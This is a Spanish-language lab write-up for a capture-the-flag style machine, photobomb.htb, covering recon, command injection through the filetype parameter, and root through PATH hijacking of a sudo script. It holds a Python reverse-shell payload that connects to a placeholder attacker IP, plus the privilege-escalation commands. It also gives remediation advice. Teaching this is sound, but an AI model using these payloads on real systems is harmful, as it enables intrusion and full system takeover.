@@ -1,0 +1,77 @@
+Resumen Ejecutivo:
+
+Se realizó una auditoría de seguridad sobre la IP 10.129.41.19. El proceso resultó en el compromiso total del sistema, 
+logrando acceso inicial a través de una Inyección de Comandos (RCE) en el servidor web 
+y una posterior Escalada de Privilegios mediante el secuestro de la variable de entorno PATH.
+
+Fase de Reconocimiento y Enumeración:
+
+2.1 Identificación de Servicios
+Se ejecutó un escaneo de puertos TCP utilizando nmap para determinar la superficie de ataque expuesta:
+
+nmap -p- -sS --open --min-rate 5000 -vvv -Pn 10.129.41.19
+
+Resultados:
+
+Puerto 22 (SSH): OpenSSH 8.2p1.
+
+Puerto 80 (HTTP): Servidor web Nginx. Redirige al dominio photobomb.htb.
+
+Análisis de Aplicación Web:
+
+Se detectó una funcionalidad en /printer que permite descargar imágenes redimensionadas. Al analizar la petición POST con Burp Suite, 
+se identificaron tres parámetros: photo, filetype y dimensions.
+
+Fase de Explotación (Weaponization)
+
+Explotación de Command Injection:
+
+El parámetro filetype no realizaba una limpieza (sanitization) adecuada de los caracteres especiales. Se utilizó el carácter ; para concatenar comandos del sistema operativo.
+
+Payload de Verificación: filetype=png;sleep+5 (El servidor tardó 5 segundos en responder, confirmando la vulnerabilidad).
+
+Establecimiento de Reverse Shell:
+
+Se utilizó un payload de Python para forzar una conexión saliente hacia la máquina del auditor (IP: 10.10.X.X):
+
+;python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TU_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+Resultado: Conexión establecida como el usuario wizard.
+
+Fase de Post-Explotación y Escalada de Privilegios:
+
+Análisis de sudoers:
+
+Tras estabilizar la TTY, se revisaron los permisos de superusuario: sudo -l reveló que el usuario puede ejecutar /opt/cleanup.sh como root manteniendo variables de entorno (SETENV).
+
+Técnica de PATH Hijacking:
+
+El script /opt/cleanup.sh invocaba el binario find sin utilizar su ruta absoluta (/usr/bin/find).
+
+Procedimiento de ataque:
+
+Se creó un binario malicioso en un directorio con permisos de escritura (/tmp):
+
+echo "/bin/bash" > /tmp/find && chmod +x /tmp/find
+Se alteró el orden de búsqueda de comandos para que el sistema busque primero en /tmp:
+
+sudo PATH=/tmp:$PATH /opt/cleanup.sh
+Resultado: El script ejecutó el "find" malicioso bajo el contexto de root, entregando una shell con privilegios máximos.
+
+Recomendaciones de Mitigación (Remediación):
+
+Validación de Entradas: Implementar una "Lista Blanca" de extensiones permitidas en el parámetro filetype y rechazar cualquier carácter especial (;, &, |, $).
+
+Rutas Absolutas en Scripts: Modificar todos los scripts de sistema para que utilicen rutas absolutas (ej. /usr/bin/find en lugar de find).
+
+Principio de Menor Privilegio: Eliminar la directiva SETENV del archivo /etc/sudoers para evitar la manipulación de variables críticas del sistema.
+
+Autoevaluación:
+
+Antes de pasar a la siguiente máquina, reflexiona sobre estos tres conceptos clave que dominaste hoy:
+
+Time-based Blind RCE: Confirmaste la vulnerabilidad con un sleep 5. Esta es la forma más profesional de verificar una inyección sin romper el servidor.
+
+TTY Stabilization: Pasaste de una shell limitada a una interactiva completa. Sin esto, la escalada de privilegios suele fallar.
+
+Variable de Entorno SETENV: Comprendiste que el peligro no solo estaba en el script /opt/cleanup.sh, sino en el permiso de sudo que permitía inyectar un PATH personalizado.
